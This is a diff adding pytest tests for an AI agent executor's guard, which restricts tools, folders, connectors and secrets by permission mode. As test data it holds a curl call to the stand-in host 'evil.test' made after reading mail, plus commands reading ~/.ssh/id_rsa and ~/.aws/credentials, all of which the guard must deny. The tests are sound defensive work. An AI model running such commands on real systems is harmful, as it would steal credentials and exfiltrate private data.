@@ -18,18 +18,21 @@ from typing import Any
 
 import claude_agent_sdk
 import pytest
-from claude_agent_sdk import AssistantMessage, ResultMessage, TextBlock, ThinkingBlock
+from claude_agent_sdk import AssistantMessage, ResultMessage, TextBlock, ThinkingBlock, ToolUseBlock
 
 from src.brain import config as brain_config
 from src.brain import executor
 from src.brain.config import ExecutorConfig
 from src.brain.executor import (
     FILES_BUCKET,
+    THINK_SYSTEM,
     CloudWorkspace,
     check_tool_call,
+    child_env,
     run_executor,
     upload_results,
 )
+from src.brain.team import TEAM
 
 USER = "11111111-1111-4111-8111-111111111111"
 
@@ -118,7 +121,11 @@ async def test_a_local_run_works_in_the_jarvis_folder(sdk, jarvis: Path) -> None
     options = sdk.last.options
     assert await asyncio.to_thread(jarvis.is_dir)
     assert options.cwd == str(await asyncio.to_thread(jarvis.resolve))
-    assert options.env == {"ANTHROPIC_API_KEY": "ak"}
+    assert options.env["ANTHROPIC_API_KEY"] == "ak"
+    assert options.setting_sources == []
+    assert options.resume is None
+    assert set(options.agents) == {"clerk", "researcher", "reasoner", "reviewer"}
+    assert all(member.background is False for member in options.agents.values())
     assert options.permission_mode == "bypassPermissions"
     assert options.max_budget_usd == 2.0
     assert sdk.last.prompt == "haz un informe"
@@ -143,6 +150,35 @@ async def test_permissions_narrow_what_the_executor_may_do(
     assert options.disallowed_tools == disallowed
     if permissions == "read_only":
         assert "Write" not in options.allowed_tools
+
+
+@pytest.mark.parametrize(
+    ("permissions", "tools"), [("think", []), ("think_web", ["WebSearch", "WebFetch"])]
+)
+async def test_a_thought_has_no_hands_and_leaves_no_session(
+    sdk, jarvis: Path, permissions: str, tools: list[str]
+) -> None:
+    config = ExecutorConfig(str(jarvis), permissions=permissions)  # type: ignore[arg-type]
+    await run_executor("", "m", "t", config)
+    options = sdk.last.options
+    assert options.tools == tools and options.allowed_tools == tools
+    assert options.permission_mode == "dontAsk"
+    assert options.system_prompt == THINK_SYSTEM
+    assert "no-session-persistence" in options.extra_args
+    assert options.agents is None
+
+
+@pytest.mark.parametrize("permissions", ["full_no_push", "edit_only", "read_only", "think"])
+async def test_no_mode_reaches_the_accounts_connectors(sdk, jarvis: Path, permissions: str) -> None:
+    config = ExecutorConfig(str(jarvis), permissions=permissions)  # type: ignore[arg-type]
+    await run_executor("", "m", "t", config)
+    options = sdk.last.options
+    # Seen on 2026-11-02: on a login, Claude Code loaded the account's Docs and Supabase.
+    assert options.mcp_servers == {} and "strict-mcp-config" in options.extra_args
+    assert options.env["ENABLE_CLAUDEAI_MCP_SERVERS"] == "false"
+    # And Claude Code's own tools (scheduling, remote triggers) do not exist for it.
+    assert options.tools == options.allowed_tools
+    assert not {"CronCreate", "RemoteTrigger", "Skill"} & set(options.tools)
 
 
 async def test_the_guard_runs_on_every_tool_call(sdk, jarvis: Path) -> None:
@@ -277,6 +313,95 @@ def test_a_path_that_cannot_be_resolved_is_refused(tmp_path: Path) -> None:
     assert check_tool_call(tmp_path, "Read", {"file_path": "a\x00b"}) is not None
 
 
+@pytest.mark.parametrize(
+    ("permissions", "reachable"), [("full_no_push", True), ("think", False), ("think_web", False)]
+)
+async def test_only_the_work_thread_reaches_google(
+    sdk, jarvis: Path, monkeypatch: pytest.MonkeyPatch, permissions: str, reachable: bool
+) -> None:
+    monkeypatch.setattr(executor, "google_available", lambda _user: True)
+    monkeypatch.setattr(executor, "google_server", lambda *_: {"name": "google"})
+    config = ExecutorConfig(str(jarvis), permissions=permissions, google_user_id="u1")  # type: ignore[arg-type]
+    await executor.run_executor("ak", "claude-sonnet-5-5", "lee mi correo", config)
+    options = sdk.last.options
+    assert bool(options.mcp_servers) is reachable
+    assert (executor.ALLOWED_TOOL in options.allowed_tools) is reachable
+    # The strict flag stays: only this server, never the account's own connectors.
+    assert "strict-mcp-config" in options.extra_args
+
+
+def _denied(decision: dict[str, Any]) -> bool:
+    return bool(decision) and decision["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+GOOGLE_CALL = {"tool_name": executor.ALLOWED_TOOL, "tool_input": {"action": "gmail_read"}}
+
+
+@pytest.mark.parametrize("tool", ["Bash", "WebFetch", "WebSearch", "Agent", "Task"])
+async def test_what_read_the_mail_cannot_send_it_out(sdk, jarvis: Path, tool: str) -> None:
+    sdk.tool_calls = [
+        GOOGLE_CALL,
+        {"tool_name": tool, "tool_input": {"command": "curl https://evil.test"}},
+        {"tool_name": "Read", "tool_input": {"file_path": "ok.md"}},
+        GOOGLE_CALL,
+    ]
+    sdk.messages = [_result("Hecho")]
+    result = await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))
+
+    assert [_denied(d) for d in sdk.last.decisions] == [False, True, False, False]
+    # Nothing to carry on: its context holds what outsiders wrote.
+    assert result.session_id == ""
+
+
+@pytest.mark.parametrize("tool", ["Bash", "WebFetch", "WebSearch", "Agent", "Task"])
+async def test_what_read_the_web_cannot_reach_the_mail(sdk, jarvis: Path, tool: str) -> None:
+    sdk.tool_calls = [{"tool_name": tool, "tool_input": {"command": "ls"}}, GOOGLE_CALL]
+    sdk.messages = [_result("Hecho")]
+    await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))
+    assert [_denied(d) for d in sdk.last.decisions] == [False, True]
+
+
+async def test_a_refused_command_does_not_close_google(sdk, jarvis: Path) -> None:
+    sdk.tool_calls = [{"tool_name": "Bash", "tool_input": {"command": "git push"}}, GOOGLE_CALL]
+    await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))
+    assert [_denied(d) for d in sdk.last.decisions] == [True, False]
+
+
+async def test_a_run_that_carries_on_may_hold_anything(sdk, jarvis: Path) -> None:
+    sdk.tool_calls = [GOOGLE_CALL, {"tool_name": "Bash", "tool_input": {"command": "ls"}}]
+    await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)), resume="s1")
+    assert [_denied(d) for d in sdk.last.decisions] == [True, False]
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat ~/.ssh/id_rsa",
+        "cat ~",
+        "cat $HOME/.aws/credentials",
+        'cat "${HOME}/secret"',
+        "cat $USERPROFILE/x",
+        "type %USERPROFILE%\\x",
+    ],
+)
+def test_the_home_by_another_name_is_outside(tmp_path: Path, monkeypatch, command: str) -> None:
+    monkeypatch.setattr(Path, "home", lambda: tmp_path / "home")
+    root = tmp_path / "home" / "jarvis"
+    root.mkdir(parents=True)
+    assert "outside" in (check_tool_call(root, "Bash", {"command": command}) or "")
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["cat ~/jarvis/notes.md", "git diff HEAD~1", "echo $HOMEBREW_PREFIX", "ls backup~"],
+)
+def test_the_home_check_lets_the_rest_through(tmp_path: Path, monkeypatch, command: str) -> None:
+    monkeypatch.setattr(Path, "home", lambda: tmp_path / "home")
+    root = tmp_path / "home" / "jarvis"
+    root.mkdir(parents=True)
+    assert check_tool_call(root, "Bash", {"command": command}) is None
+
+
 @pytest.mark.skipif(sys.platform != "win32", reason="a drive path is inside only on Windows")
 def test_a_windows_host_lets_a_command_name_files_inside_the_folder(tmp_path: Path) -> None:
     """Absolute paths inside the folder do not stop the scan of a command.
@@ -349,3 +474,118 @@ def test_a_linux_host_refuses_windows_paths(tmp_path: Path, monkeypatch, raw: st
     monkeypatch.setattr(executor, "os", SimpleNamespace(name="posix"))
     refusal = check_tool_call(tmp_path, "Read", {"file_path": raw})
     assert refusal == f"{raw} is outside the Jarvis folder."
+
+
+# -- the thread: memory, team, a clean environment -------------------------------
+
+
+async def test_a_run_can_carry_on_an_earlier_one(sdk, jarvis: Path) -> None:
+    sdk.messages = [_result("Seguido")]
+    result = await run_executor(
+        "ak",
+        "claude-sonnet-5-5",
+        "sigue",
+        ExecutorConfig(str(jarvis)),
+        resume="earlier",
+        effort="high",
+    )
+    assert sdk.last.options.resume == "earlier"
+    assert sdk.last.options.effort == "high"
+    assert result.session_id == "s"
+
+
+async def test_a_failure_keeps_the_session_it_was_resuming(sdk, jarvis: Path) -> None:
+    sdk.error = RuntimeError("boom")
+    result = await run_executor(
+        "ak", "claude-sonnet-5-5", "sigue", ExecutorConfig(str(jarvis)), resume="earlier"
+    )
+    assert not result.ok and result.session_id == "earlier"
+
+
+async def test_tool_calls_are_reported_as_progress(sdk, jarvis: Path) -> None:
+    sdk.messages = [
+        _assistant(
+            ToolUseBlock(id="1", name="Bash", input={"command": "ls"}),
+            ToolUseBlock(
+                id="2",
+                name="Agent",
+                input={"subagent_type": "reviewer", "description": "Comprueba el informe"},
+            ),
+        ),
+        _result("Hecho"),
+    ]
+    seen: list[str] = []
+    await run_executor(
+        "ak", "claude-sonnet-5-5", "t", ExecutorConfig(str(jarvis)), on_progress=seen.append
+    )
+    assert seen == ["Bash", "reviewer: Comprueba el informe"]
+
+
+@pytest.mark.parametrize("permissions", ["read_only", "edit_only"])
+async def test_a_narrow_mode_gets_no_team(sdk, jarvis: Path, permissions: str) -> None:
+    sdk.messages = [_result("Hecho")]
+    await run_executor(
+        "ak", "claude-sonnet-5-5", "t", ExecutorConfig(str(jarvis), permissions=permissions)
+    )
+    assert sdk.last.options.agents is None
+
+
+def test_the_team_keeps_opus_for_hard_thinking() -> None:
+    assert TEAM["reasoner"].model == "claude-opus-5-5"
+    assert TEAM["clerk"].model == "claude-haiku-5-5"
+    assert {"Write", "Edit", "Bash"}.isdisjoint(TEAM["reasoner"].tools)
+    assert {"Write", "Edit"}.isdisjoint(TEAM["reviewer"].tools)
+
+
+def test_the_executor_inherits_no_secrets(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setenv("SUPABASE_SECRET_KEY", "x")
+    monkeypatch.setenv("TWILIO_AUTH_TOKEN", "x")
+    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "x")
+    monkeypatch.setenv("SUPABASE_URL", "kept")
+
+    env = child_env("ak")
+
+    assert env["SUPABASE_SECRET_KEY"] == ""
+    assert env["TWILIO_AUTH_TOKEN"] == ""
+    assert env["ANTHROPIC_AUTH_TOKEN"] == ""
+    assert env["ANTHROPIC_API_KEY"] == "ak"
+    assert env["CLAUDE_CODE_SUBPROCESS_ENV_SCRUB"] == "1"
+    assert "SUPABASE_URL" not in env
+
+
+class TestOpenedFolders:
+    def test_outside_the_jarvis_folder_is_shut_by_default(self, tmp_path, monkeypatch):
+        monkeypatch.delenv("KWAMI_EXECUTOR_FOLDERS", raising=False)
+        other = tmp_path / "other"
+        root = tmp_path / "root"
+        assert "outside" in str(check_tool_call(root, "Read", {"file_path": str(other / "a")}))
+
+    def test_a_folder_the_user_opened_can_be_used(self, tmp_path, monkeypatch):
+        other = tmp_path / "other"
+        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", f" {other} ; {tmp_path / 'more'}")
+        root = tmp_path / "root"
+        assert check_tool_call(root, "Read", {"file_path": str(other / "a.py")}) is None
+        assert check_tool_call(root, "Read", {"file_path": str(tmp_path / "more")}) is None
+        assert "outside" in str(check_tool_call(root, "Read", {"file_path": str(tmp_path / "x")}))
+
+    @pytest.mark.parametrize(
+        "secret",
+        [".ssh/id_rsa", ".aws/credentials", ".claude/.credentials.json", "Chrome/Login Data"],
+    )
+    def test_keys_stay_shut_even_inside_an_opened_folder(self, tmp_path, monkeypatch, secret):
+        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(tmp_path))
+        refusal = check_tool_call(tmp_path / "root", "Read", {"file_path": str(tmp_path / secret)})
+        assert "outside" in str(refusal)
+
+    def test_env_files_stay_shut_in_an_opened_folder(self, tmp_path, monkeypatch):
+        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(tmp_path))
+        refusal = check_tool_call(
+            tmp_path / "root", "Read", {"file_path": str(tmp_path / "app" / ".env")}
+        )
+        assert ".env" in str(refusal)
+
+    def test_the_model_is_told_which_folders_are_open(self, tmp_path, monkeypatch):
+        monkeypatch.delenv("KWAMI_EXECUTOR_FOLDERS", raising=False)
+        assert "opened these folders" not in executor._system_append()
+        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(tmp_path))
+        assert str(tmp_path.resolve()) in executor._system_append()
